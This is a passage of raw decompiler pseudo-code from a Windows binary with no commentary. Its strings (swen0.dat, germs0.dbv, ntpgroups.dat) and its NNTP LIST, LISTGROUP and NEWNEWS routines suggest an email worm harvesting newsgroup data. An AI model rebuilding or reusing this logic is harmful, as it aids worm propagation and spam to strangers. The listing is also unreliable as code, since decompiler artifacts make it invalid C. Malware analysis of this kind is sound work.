            if(*L0041A670 != esi) {
                goto L00404dc6;
            }
            *L0041A59C = 1;
            (save)esi;
            (save)0x404e8e;
            (save)esi;
            (save)101;
            (save) *L0041A594;
            eax = *__imp__DialogBoxParamA();
            if(*L0041A670 != esi) {
                (save)0x404cf5;
                (save)20000;
                (save) *L00412EF8;
                (save)esi;
                eax = *__imp__SetTimer();
                goto L00404e79;
L00404dc6:
                eax = L00406F04();
                if(eax != 0) {
                    *(ebp - 32) = esi;
                    edi = 1;
                    if(*L00412F34 == esi) {
                        *L0041A59C = 1;
                        if(L0040436A() != 0) {
                            L004066EB(-2147483646, 4302344, "Counter Visited", edi, "yes");
                        }
                        *L00412F34 = edi;
                        *L0041A59C = esi;
                    }
                    if(*L0041A6D8 != esi) {
                        eax = *L0041A604;
                        edx = 0;
                        *(ebp - 32) = 0x404606;
                        if(20 / 20 % 20 / 20 == 0) {
                            goto L00404e3f;
                        }
                    }
                    *(ebp - 32) = 0x401e2d;
L00404e3f:
                    *L0041A604 = *L0041A604 + 1;
                    *L0041A59C = edi;
                    (save)ebp - 28;
                    (save)esi;
                    (save)esi;
                    (save) *(ebp - 32);
                    (save)esi;
                    (save)esi;
                    eax = *__imp__CreateThread();
                    *L00412EFC = eax;
                    if(eax == esi) {
                        goto L00404d6c;
                    }
                    eax = *__imp__CloseHandle(eax);
                    goto L00404e79;
                    return(1);
                    esp = *(ebp - 24);
                }
            }
        }
    }
L00404e79:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
    return;
    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252656;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 108;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    esi = 0;
    *(ebp - 4) = 0;
    if(!(eax = *(ebp + 12) - 272)) {
        if(eax = eax - 1) {
            goto L00404fc3;
        }
        ecx = *(ebp + 16);
        eax = cx & 65535;
        edx = 1003;
        if(eax < 1003) {
            goto L00404fc3;
        }
        ebx = 1004;
        if(eax > 1004) {
            if(eax != 1005) {
                if(eax != 1006) {
                    goto L00404fc3;
                }
                *L0041A59C = 0;
                (save)0;
L00404f03:
                (save) *(ebp + 8);
                *__imp__EndDialog();
L00404f0c:
                *(ebp - 4) = *(ebp - 4) | -1;
                eax = 1;
                goto L00404fc9;
            }
            if(L004070C1( *(ebp + 8)) == 0) {
                goto L00404f0c;
            }
            *L0041A670 = 1;
            *L0041A59C = esi;
            (save)1;
            goto L00404f03;
        }
        if(ecx >> 16 != 1024) {
            goto L00404f0c;
        }
        *(ebp - 124) = 0;
        ecx = 24;
        eax = 0;
        edi = ebp - 123;
        asm("rep stosd");
        *edi = eax;
        edi = edi + 4;
        *edi = al;
        edi = edi + 1;
        (save)100;
        (save)ebp - 124;
        (save)edx;
        edi = *(ebp + 8);
        (save)edi;
        esi = __imp__GetDlgItemTextA;
        *__imp__GetDlgItemTextA();
        if(L0040A210(ebp - 124) != 0) {
            *(ebp - 124) = 0;
            (save)100;
            (save)ebp - 124;
            (save)ebx;
            (save)edi;
            *esi();
            if(L0040A210(ebp - 124) <= 0) {
                goto L00404f92;
            }
            (save)1;
        } else {
L00404f92:
            (save)0;
        }
        (save)1005;
        (save)edi;
        (save) *__imp__GetDlgItem();
        *__imp__EnableWindow();
        goto L00404f0c;
    }
    *__imp__ShowWindow( *(ebp + 8), 5);
    goto L00404f0c;
    return(1);
    esp = *(ebp - 24);
L00404fc3:
    *(ebp - 4) = *(ebp - 4) | -1;
    eax = 0;
L00404fc9:
    ecx = *(ebp - 16);
    *%fs:0x0] = ecx;
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
    return;
    esp = esp - 400;
    (save)ebx;
    (save)esi;
    (save)esp;
    esi = ecx;
    (save)257;
    L0040A046();
    eax = esi + 30160;
    (save)eax;
    *(esi + 4) = 0;
    *(esi + 30004) = 1;
    *(esi + 30008) = 0;
    *(esi + 30158) = 0;
    *esi = 0;
    *__imp__InitializeCriticalSection();
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    *L00412DD4 = *__imp__CreateEventA();
    eax = esi;
    (restore)esi;
    (restore)ebx;
    esp = esp + 400;
    return;
    (save)esi;
    esi = ecx;
    eax = *esi;
    if(eax != 0) {
        (save)eax;
        L0040A01C();
    }
    L0040A04C();
    *__imp__DeleteCriticalSection();
    eax = *__imp__CloseHandle( *L00412DD4, esi + 30160);
    (restore)esi;
    return;
    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252672;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    (save)ecx;
    (save)ecx;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp - 4) = 0;
    if(!(eax = *(ebp + 12) - 1 - 1)) {
        if(!(eax = eax - 1042)) {
            (save) *(ebp + 20);
            (save) *(ebp + 16);
            (save) *(ebp + 12);
            (save) *(ebp + 8);
            eax = *__imp__DefWindowProcA();
            goto L004050e4;
        }
        if(!(eax = ( *(ebp + 20) & 255) - 1)) {
            if(eax = eax - 31) {
                goto L004050da;
            }
            ecx = 0x412f48;
            L004018D3();
        } else {
            ecx = 0x412f48;
            L0040166C();
        }
    } else {
L004050da:
        *__imp__PostQuitMessage(0);
        eax = 0;
L004050e4:
        *(ebp - 4) = *(ebp - 4) | -1;
        goto L004050f7;
        return(1);
        esp = *(ebp - 24);
    }
    *(ebp - 4) = *(ebp - 4) | -1;
    eax = 0;
L004050f7:
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00405108 - 0x00405473
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00405108()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252688;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    (save)ecx;
    eax = 8328;
    L0040A560(ecx);
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp + -348) = 0;
    (save)49;
    eax = 0;
    edi = ebp + -347;
    asm("rep stosd");
    *edi = eax;
    edi = edi + 4;
    *edi = al;
    edi = edi + 1;
    edi = 0;
    *(ebp - 4) = 0;
    eax = L00406F04();
    if(eax != 0) {
        esi = __imp__wsprintfA;
        *__imp__wsprintfA(ebp + -140, "%s\nntpgroups.dat", 0x412f00);
        (save)edi;
        (save)128;
        (save)3;
        (save)edi;
        (save)3;
        (save)-1073741824;
        (save)ebp + -140;
        ebx = __imp__CreateFileA;
        edi = *__imp__CreateFileA();
        *(ebp + -352) = edi;
        if(edi != -1) {
            goto L0040544a;
        }
        *(ebp + -8352) = 0;
        ecx = 1999;
        eax = 0;
        edi = ebp + -8351;
        asm("rep stosd");
        *edi = eax;
        edi = edi + 4;
        *edi = al;
        edi = edi + 1;
        *esi(ebp + -140, "%s\swen0.dat", 0x412f00);
        (save)0;
        edi = 128;
        (save)128;
        (save)3;
        (save)0;
        (save)3;
        (save)-2147483648;
        (save)ebp + -140;
        eax = *ebx();
        *(ebp + -352) = eax;
        if(eax == -1) {
            goto L00405266;
        }
        (save)ebp - 28;
        (save)eax;
        eax = *__imp__GetFileSize();
        *(ebp + -144) = eax;
        (save)0;
        (save)ebp - 28;
        (save)eax;
        (save)ebp + -348;
        (save) *(ebp + -352);
        *__imp__ReadFile();
        (save) *(ebp + -352);
        *__imp__CloseHandle();
        (save)ebp + -140;
        *__imp__DeleteFileA();
        eax = L0040584B(ebp + -348);
        if(eax == 1) {
L0040525c:
            eax = L00405108();
            goto L00405461;
L00405266:
            *esi(ebp + -140, "%s\swen1.dat", 0x412f00);
            (save)0;
            (save)edi;
            (save)3;
            (save)0;
            (save)3;
            (save)-1073741824;
            (save)ebp + -140;
            eax = *ebx();
            esi = eax;
            *(ebp + -352) = esi;
            ebx = ebx | -1;
            if(esi != ebx) {
                (save)ebp - 28;
                (save)esi;
                eax = *__imp__GetFileSize();
                *(ebp + -144) = eax;
                if(eax >= 3) {
                    goto L004052d4;
                }
                (save)esi;
                *__imp__CloseHandle();
                (save)ebp + -140;
                eax = *__imp__DeleteFileA();
            }
            *(ebp - 4) = ebx;
            goto L00405465;
L004052d4:
            (save)0;
            (save)ebp - 28;
            (save)eax;
            (save)ebp + -8352;
            (save)esi;
            *__imp__ReadFile();
            eax = L00406850( *(ebp + -144) - 1);
            *(ebp - 28) = eax;
            eax = ebp + *(ebp - 28) + -8352;
            *(ebp - 36) = eax;
            cl = *eax;
            if(cl == 13 || cl == 10) {
                eax = eax + 1 + 1;
                *(ebp - 36) = eax;
            }
            edi = L0040A070(eax, "\r\n");
            *(ebp - 40) = edi;
            if(edi == 0) {
                edi = ebp + *(ebp + -144) + -8352;
                *(ebp - 40) = edi;
            }
            ecx = 0;
            *(ebp + -148) = 0;
            for(eax = *(ebp - 28); 1; eax = eax - 1) {
                *(ebp - 32) = eax;
                if(eax < 0) {
                    goto L0040537c;
                }
                if(*(ebp + eax + -8352) == 13 && *(ebp + eax + -8351) == 10) {
                    break;
                }
            }
            ecx = ebp + eax + -8350;
            *(ebp + -148) = ecx;
            *(ebp - 28) = eax + 2;
L0040537c:
            if(ecx == 0) {
                ecx = ebp + -8352;
                *(ebp + -148) = ecx;
                *(ebp - 28) = 0;
            }
            if(edi - ecx > 4) {
                *edi = 0;
                if(L0040584B(ecx) == ebx) {
                    (save)0;
                    (save)0;
                    (save) *(ebp - 28);
                    (save)esi;
                    ebx = __imp__SetFilePointer;
                    *__imp__SetFilePointer();
                    if(*(edi + 1) == 10) {
                        edi = edi + 1 + 1;
                        *(ebp - 40) = edi;
                    }
                    if(*edi != 0) {
                        (save)0;
                        (save)ebp + -144;
                        (save)L0040A210(edi);
                        (save)edi;
                        (save)esi;
                        *__imp__WriteFile();
                        goto L0040542f;
                    }
                    if(*(ebp - 28) == 0) {
                        (save)esi;
                        *__imp__CloseHandle();
                        esi = 0;
                        *(ebp + -352) = 0;
                        (save)ebp + -140;
                        *__imp__DeleteFileA();
                    } else {
                        if(*(ebp + *(ebp - 28) + -8353) == 10) {
                            *(ebp - 28) = *(ebp - 28) - 2;
                            (save)0;
                            (save)0;
                            (save) *(ebp - 28);
                            (save)esi;
                            *ebx();
L0040542f:
                            (save)esi;
                            *__imp__SetEndOfFile();
                        }
                    }
                }
            }
            if(esi == 0) {
                goto L0040525c;
            }
            (save)esi;
            *__imp__CloseHandle();
            goto L0040525c;
L0040544a:
            L00405474(edi);
            eax = *__imp__CloseHandle(edi);
            goto L00405461;
            return(1);
            esp = *(ebp - 24);
        }
    }
L00405461:
    *(ebp - 4) = *(ebp - 4) | -1;
L00405465:
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00405474 - 0x0040584A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00405474()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252704;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 560;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    ebx = 0;
    *(ebp + -388) = 0;
    *(ebp + -176) = 0;
    ecx = 37;
    eax = 0;
    edi = ebp + -175;
    asm("rep stosd");
    *edi = al;
    edi = edi + 1;
    *(ebp + -552) = bl;
    ecx = 37;
    eax = 0;
    edi = ebp + -551;
    asm("rep stosd");
    *edi = al;
    edi = edi + 1;
    *(ebp + -396) = ebx;
    *(ebp - 4) = ebx;
    edi = *(ebp + 8);
    if(edi != -1 && edi != ebx) {
        (save)ebx;
        (save)edi;
        esi = *__imp__GetFileSize();
        *(ebp + -392) = esi;
        (save)ebx;
        (save)ebp + -184;
        (save)199;
        (save)ebp + -384;
        (save)edi;
        *__imp__ReadFile();
        *(ebp + *(ebp + -184) + -384) = bl;
        eax = L0040ACB0(ebp + -384, 58);
        *(ebp + -180) = eax;
        if(eax != ebx) {
            edi = eax + 1;
            if(*edi == 121) {
                *(ebp + -396) = 1;
            }
            *eax = bl;
            L0040A0F0(ebp + -176, ebp + -383);
            if(*(ebp + -396) != ebx && L00406840(10) != 0) {
                L004063F0(ebp + -176, *(ebp + 8));
            }
            eax = L0040A070(edi, "\r\n");
            *(ebp + -400) = eax;
            if(eax != ebx) {
                *(ebp + -388) = eax - ebp + -384 + 1 + 1;
            }
            while(esi > *(ebp + -388)) {
                eax = L00406F04();
                if(eax == 0) {
                    goto L00405838;
                }
                *__imp__wsprintfA(ebp + -384, "%s\germs0.dbv", 0x412f00);
                (save)ebx;
                (save)128;
                (save)3;
                (save)ebx;
                (save)3;
                (save)-2147483648;
                (save)ebp + -384;
                edi = *__imp__CreateFileA();
                *(ebp + -560) = edi;
                if(edi != -1) {
                    (save)ebx;
                    (save)edi;
                    *(ebp + -184) = *__imp__GetFileSize();
                    (save)edi;
                    eax = *__imp__CloseHandle();
                    if(*(ebp + -184) > 5000) {
                        goto L00405838;
                    }
                }
                edi = *(ebp + -388);
                if(esi >= edi + 205) {
                    *(ebp + -556) = L00406850(esi - edi - 201);
                    *(ebp + -556) = *(ebp + -556) + edi;
                } else {
                    *(ebp + -556) = ebx;
                }
                (save)ebx;
                (save)ebx;
                (save) *(ebp + -556);
                (save) *(ebp + 8);
                *__imp__SetFilePointer();
                (save)ebx;
                (save)ebp + -184;
                (save)199;
                (save)ebp + -384;
                (save) *(ebp + 8);
                *__imp__ReadFile();
                *(ebp + *(ebp + -184) + -384) = bl;
                edi = "\r\n";
                eax = L0040A070(ebp + -384, edi);
                *(ebp + -400) = eax;
                if(eax == ebx) {
                    goto L00405838;
                }
                eax = eax + 1 + 1;
                *(ebp + -400) = eax;
                eax = L0040A070( *(ebp + -400), edi);
                *(ebp + -180) = eax;
                if(eax != ebx) {
                    *eax = bl;
                }
                (save) *(ebp + -400);
                (save)ebp + -552;
                L0040A0F0();
                (save)ebp + -552;
                (save)ebp + -176;
                L00405CDC();
                (save)esi + 3;
                esp = esp + 20;
                edi = L0040AA95();
                *(ebp + -568) = edi;
                *(ebp + -564) = edi;
                if(edi == ebx) {
                    continue;
                }
                (save)ebx;
                (save)ebx;
                (save)ebx;
                (save) *(ebp + 8);
                *__imp__SetFilePointer();
                (save)ebx;
                (save)ebp + -184;
                (save)esi;
                (save)edi;
                (save) *(ebp + 8);
                *__imp__ReadFile();
                *(edi + esi) = bl;
                esi = L0040A070(edi, ebp + -552);
                *(ebp + -400) = esi;
                if(esi != ebx) {
                    eax = L0040A070(esi, "\r\n");
                    *(ebp + -180) = eax;
                    if(*(ebp + -180) != ebx) {
                        *(ebp + -180) = *(ebp + -180) + 2;
                        esi = esi - edi;
                        *(ebp + -556) = esi;
                        (save)ebx;
                        (save)ebx;
                        (save) *(ebp + -556);
                        (save) *(ebp + 8);
                        *__imp__SetFilePointer();
                        esi = *(ebp + -180);
                        if(*esi != bl) {
                            (save)ebx;
                            (save)ebp + -184;
                            (save)L0040A210(esi);
                            (save)esi;
                            (save) *(ebp + 8);
                            *__imp__WriteFile();
                        }
                        (save) *(ebp + 8);
                        *__imp__SetEndOfFile();
                    }
                    *(ebp + -576) = edi;
                    L0040AB34(edi);
                    (save)ebx;
                    (save) *(ebp + 8);
                    *(ebp + -392) = *__imp__GetFileSize();
                } else {
                    *(ebp + -572) = edi;
                    L0040AB34(edi);
                }
                esi = *(ebp + -392);
            }
            (save) *(ebp + 8);
            *__imp__CloseHandle();
            *__imp__wsprintfA(ebp + -384, "%s\nntpgroups.dat", 0x412f00);
            eax = *__imp__DeleteFileA(ebp + -384);
            goto L00405838;
            return(1);
            esp = *(ebp - 24);
        }
    }
L00405838:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x0040584B - 0x00405B24
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040584B()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252720;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    (save)ecx;
    (save)ecx;
    eax = 30116;
    L0040A560();
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp + -30136) = 0;
    *(ebp - 4) = 0;
    if(L00406F04() == 0) {
L0040588e:
        eax = 0;
L00405890:
        *(ebp - 4) = *(ebp - 4) | -1;
    } else {
        edi = 1;
        esi = 0x412f48;
        ecx = 0x412f48;
        L00401B15(1);
        ecx = esi;
        L004018D3();
        *(ebp + -30032) = 0;
        ecx = esi;
        if(L00401946( *(ebp + 8), 119, *L0041A6DC) == 0) {
            ecx = esi;
            eax = L00401946( *(ebp + 8), 119, *L0041A6DC);
            if(eax != 0) {
                goto L004058e8;
            }
            eax = eax | -1;
            goto L00405890;
        }
L004058e8:
        (save)12000;
        (save) *L00412DD4;
        ebx = __imp__WaitForSingleObject;
        if(*__imp__WaitForSingleObject() == 258) {
L00405902:
            (save)-1;
        } else {
            ecx = esi;
            if(L0040A5F0(L00401830(ebp + -30132, 4), "20", 2) != 0) {
                goto L00405902;
            }
            if(*(ebp + -30130) == 48) {
                *(ebp + -30136) = edi;
            }
            ecx = esi;
            if(L00401B0D() == 0) {
                goto L00405902;
            }
            edi = __imp__wsprintfA;
            *__imp__wsprintfA(ebp + -30132, "%s\nntpgroups.dat", 0x412f00);
            (save)0;
            (save)128;
            (save)2;
            (save)0;
            (save)3;
            (save)1073741824;
            (save)ebp + -30132;
            eax = *__imp__CreateFileA();
            *(ebp + -30140) = eax;
            *edi(ebp + -30132, "[%s:%c]\r\n", *(ebp + 8), 121);
            (save)0;
            (save)ebp - 28;
            (save)L0040A210(ebp + -30132);
            (save)ebp + -30132;
            (save) *(ebp + -30140);
            *__imp__WriteFile();
            L0040A0F0(ebp + -30132, "LIST\r\n");
            ecx = esi;
            L00401A9E(ebp + -30132);
            (save)20000;
            (save) *L00412DD4;
            eax = *ebx();
            edi = 258;
            if(eax != 258) {
                ecx = esi;
                if(L0040A5F0(L00401830(ebp + -30032, 29999), "215", 3) == 0) {
                    eax = L0040A070(ebp + -30032, "\r\n");
                    *(ebp - 32) = eax;
                    eax = eax != 0 ? eax + 1 + 1 : ebp + -30032;
                    *(ebp - 32) = eax;
                    eax = L00405B67(eax, *(ebp + -30140));
                    if(eax != 0) {
                        goto L00405ae5;
                    }
                    ecx = esi;
                    L00401B15(eax);
                    while(1) {
                        (save)50000;
                        (save) *L00412DD4;
                        eax = *ebx();
                        *(ebp - 28) = eax;
                        if(*(ebp - 28) == edi) {
                            goto L00405ad4;
                        }
                        ecx = esi;
                        if(L00401B0D() == 0) {
                            goto L00405ad4;
                        }
                        ecx = esi;
                        L00401830(ebp + -30032, 29999);
                        if(*(ebp + -30032) == 0) {
                            continue;
                        }
                        if(L00405B67(ebp + -30032, *(ebp + -30140)) != 0) {
                            goto L00405ae5;
                        }
                    }
                }
            }
L00405ad4:
            (save) *(ebp + -30140);
        }
        L00405B25();
        (restore)ecx;
        goto L0040588e;
L00405ae5:
        ecx = esi;
        L004018D3();
        if(*(ebp + -30140) != -1) {
            *__imp__CloseHandle( *(ebp + -30140));
        }
        eax = 1;
        goto L00405890;
        return(1);
        esp = *(ebp - 24);
        *(ebp - 4) = *(ebp - 4) | -1;
        eax = 0;
    }
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x00405B25 - 0x00405B66
 *	Argument size: -96
 *	Local size: 100
 *	Save regs size: 0
 */

L00405B25(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vffffff9c;



    ecx = 0x412f48;
    eax = L004018D3();
    if(A8 != -1) {
        (save)A8;
        *__imp__CloseHandle();
        *__imp__wsprintfA( & Vffffff9c, "%s\nntpgroups.dat", 0x412f00);
        eax = *__imp__DeleteFileA( & Vffffff9c);
    }
}

stack space not deallocated on return
/*	Procedure: 0x00405B67 - 0x00405CDB
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00405B67()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252736;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 32;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp - 4) = 0;
    if(*(ebp + 12) != 0 && *(ebp + 12) != -1 && *(ebp + 8) != 0) {
        if(L0040A5F0( *(ebp + 8), ".\r\n", 3) != 0) {
            ebx = "\r\n";
            esi = L0040A070( *(ebp + 8), ebx);
            *(ebp - 40) = esi;
            if(esi == 0) {
                goto L00405cac;
            }
            esi = esi + 1 + 1;
            *(ebp - 40) = esi;
            do {
                if(L0040A5F0(esi, ".\r\n", 3) == 0) {
                    goto L00405bfb;
                }
                eax = L0040A070(esi, ebx);
                *(ebp - 32) = eax;
                if(eax != 0) {
                    *eax = 0;
                    *(ebp - 32) = eax + 1 + 1;
                    edi = L0040ACB0(esi, 32);
                    *(ebp - 44) = edi;
                    if(edi != 0) {
                        *edi = 0;
                        edi = edi + 1;
                        *(ebp - 44) = edi;
                        if(*edi != 0) {
                            eax = L0040ACB0(edi, 32);
                            *(ebp - 28) = eax;
                            if(eax != 0) {
                                eax = eax + 1;
                                *(ebp - 28) = eax;
                                if(*eax != 0) {
                                    (save)eax;
                                    (save)edi;
                                    *(ebp - 48) = L0040ABCA();
                                    (restore)ecx;
                                    if(L0040ABCA() - *(ebp - 48) > 10) {
                                        L0040A100(esi, ebx);
                                        *__imp__WriteFile( *(ebp + 12), esi, L0040A210(esi), ebp - 36, 0);
                                    }
                                }
                            }
                        }
                    }
                }
                esi = *(ebp - 32);
                *(ebp - 40) = esi;
            } while(esi != 0);
        } else {
L00405bfb:
            eax = 1;
L00405bfe:
            *( *(ebp + 8)) = 0;
L00405c04:
            *(ebp - 4) = *(ebp - 4) | -1;
            goto L00405ccd;
        }
        goto L00405cc1;
L00405cac:
        eax = 0;
        goto L00405bfe;
    }
    eax = 0;
    goto L00405c04;
    return(1);
    esp = *(ebp - 24);
L00405cc1:
    *(ebp - 4) = *(ebp - 4) | -1;
    *( *(ebp + 8)) = 0;
    eax = 0;
L00405ccd:
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00405CDC - 0x0040610D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00405CDC()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252752;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    (save)ecx;
    (save)ecx;
    eax = 30136;
    L0040A560();
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp - 4) = 0;
    eax = L00406F04();
    if(eax != 0) {
        esi = 0x412f48;
        ecx = 0x412f48;
        L00401B15(1);
        edi = 4302872;
        ecx = 4302872;
        L00401BE7();
        ecx = esi;
        eax = L00401946( *(ebp + 8), 119, *L0041A6DC);
        *(ebp + -30144) = eax;
        if(eax != 1) {
            goto L00405da0;
        }
        (save)12000;
        (save) *L00412DD4;
        ebx = __imp__WaitForSingleObject;
        eax = *__imp__WaitForSingleObject();
        if(eax != 258) {
            ecx = esi;
            L00401830(ebp + -30140, 4);
            eax = L0040A5F0(ebp + -30140, "20", 2);
            if(eax == 0) {
                goto L00405dae;
            }
            goto L00405fc3;
L00405da0:
            if(eax != 0) {
                ebx = __imp__WaitForSingleObject;
L00405dae:
                *__imp__wsprintfA(ebp + -30140, "LISTGROUP %s\r\n", *(ebp + 12));
                ecx = esi;
                L00401A9E(ebp + -30140);
                (save)15000;
                (save) *L00412DD4;
                eax = *ebx();
                if(eax != 258) {
                    ecx = esi;
                    L00401830(ebp + -30040, 30005);
                    if(L0040A5F0(ebp + -30040, "211", 3) == 0) {
                        goto L00405f0d;
                    }
                    ecx = esi;
                    eax = L00401B0D();
                    if(eax != 0) {
                        (save)L00406850(59);
                        (save)L00406850(59);
                        (save)L00406850(23);
                        (save)L00406850(27);
                        (save)L00406850(12);
                        (save)L00406850(20) + 79;
                        (save) *(ebp + 12);
                        (save)"NEWNEWS %s %02u%02u%02u %02u%02u%02u";
                        (save)ebp + -30140;
                        *__imp__wsprintfA();
                        (save)50;
                        esp = esp + 40;
                        if(L00406840() != 0) {
                            L0040A100(ebp + -30140, " GMT");
                        }
                        L0040A100(ebp + -30140, "\r\n");
                        ecx = esi;
                        L00401A9E(ebp + -30140);
                        (save)25000;
                        (save) *L00412DD4;
                        eax = *ebx();
                        if(eax != 258) {
                            ecx = esi;
                            L00401830(ebp + -30040, 30005);
                            if(L0040A5F0(ebp + -30040, "230", 3) != 0) {
                                ecx = esi;
                                eax = L004018D3();
                            } else {
L00405f0d:
                                ecx = esi;
                                eax = L00401B0D();
                                if(eax != 0) {
                                    eax = L0040A070(ebp + -30040, "\r\n");
                                    *(ebp - 32) = eax;
                                    eax = eax != 0 ? eax + 1 + 1 : ebp + -30040;
                                    *(ebp - 32) = eax;
                                    eax = L0040610E(eax, 1);
                                    if(eax == 0) {
                                        ecx = esi;
                                        L00401B15(eax);
                                        while(1) {
                                            (save)50000;
                                            (save) *L00412DD4;
                                            eax = *ebx();
                                            *(ebp - 28) = eax;
                                            if(*(ebp - 28) == 258) {
                                                break;
                                            }
                                            ecx = esi;
                                            if(L00401B0D() == 0) {
                                                break;
                                            }
                                            ecx = esi;
                                            L00401830(ebp + -30040, 30005);
                                            if(*(ebp + -30040) == 0) {
                                                continue;
                                            }
                                            if(L0040610E(ebp + -30040, 0) != 0) {
                                                goto L00405fb1;
                                            }
                                        }
                                        ecx = edi;
                                    } else {
L00405fb1:
                                        ecx = esi;
                                        ecx = edi;
                                        if(L00401B0D() != 0) {
                                            goto L00405fcc;
                                        }
                                    }
                                    eax = L00401BE7();
                                }
                            }
                        }
                    }
                }
            }
        }
    }
L00405fc3:
    *(ebp - 4) = *(ebp - 4) | -1;
    goto L004060ff;
L00405fcc:
    if(L00401D8A() > 0) {
        *(ebp + -30152) = 0;
        ecx = esi;
        L00401B15(0);
        ecx = edi;
        eax = L00401D8A();
        75 = eax * eax;
        eax = L0040AA95(eax);
        *(ebp + -30156) = eax;
        *(ebp + -30152) = eax;
        if(*(ebp + -30152) != 0) {
            ecx = edi;
            *(ebp + -30148) = L00401D8A();
            L00406212(0, 0);
            ecx = edi;
            ecx = esi;
            L00401A9E(L00401D8E( *(ebp + -30156), 0));
            ecx = edi;
            L00401BE7();
            do {
                (save)50000;
                (save) *L00412DD4;
                *(ebp - 28) = *ebx();
                ecx = esi;
                L00401830(ebp + -30040, 29999);
                if(*(ebp + -30040) == 0 || L00406212(ebp + -30040, *(ebp + -30148)) != 0 || *(ebp - 28) == 258) {
                    break;
                }
                ecx = esi;
            } while(L00401B0D() != 0);
            ecx = edi;
            if(L00401D8A() > 0) {
                *__imp__wsprintfA(ebp + -30140, "%s\germs0.dbv", 0x412f00);
                ecx = edi;
                L00401C5A(ebp + -30140);
            }
            eax = *(ebp + -30152);
            *(ebp + -30160) = eax;
            L0040AB34( *(ebp + -30160));
        }
    }
    *(ebp - 4) = *(ebp - 4) | -1;
    goto L004060f8;
    return(1);
    esp = *(ebp - 24);
    *(ebp - 4) = *(ebp - 4) | -1;
    edi = 4302872;
L004060f8:
    ecx = edi;
    eax = L00401BE7();
L004060ff:
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x0040610E - 0x00406211
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040610E()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252768;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 16;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    edi = *(ebp + 8);
    if(*(ebp + 12) != 0) {
        *L0041A6E8 = 0;
    }
    *(ebp - 4) = 0;
    ebx = "\r\n";
    for(esi = 4302568; 1; *(ebp - 32) = edi) {
        if(edi == 0) {
            goto L004061fd;
        }
        if(L0040A5F0(edi, ".\r\n", 3) == 0) {
            break;
        }
        eax = L0040A070(edi, ebx);
        *(ebp - 28) = eax;
        if(eax == 0) {
            if(L0040A210(edi) < 300) {
                L0040A0F0(esi, edi);
            }
        } else {
            *eax = 0;
            *(ebp - 28) = eax + 1 + 1;
            if(*L0041A6E8 == 0) {
                ecx = 4302872;
                L00401B22(edi, 0);
            } else {
                L0040A100();
                eax = L0040A070(esi, ebx, esi, edi);
                if(eax == 0) {
                    ecx = 4302872;
                    L00401B22(esi, eax);
                }
                *L0041A6E8 = 0;
            }
        }
        edi = *(ebp - 28);
    }
    *(ebp - 4) = *(ebp - 4) | -1;
    eax = 1;
    goto L00406203;
    return(1);
    esp = *(ebp - 24);
L004061fd:
    *(ebp - 4) = *(ebp - 4) | -1;
    eax = 0;
L00406203:
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

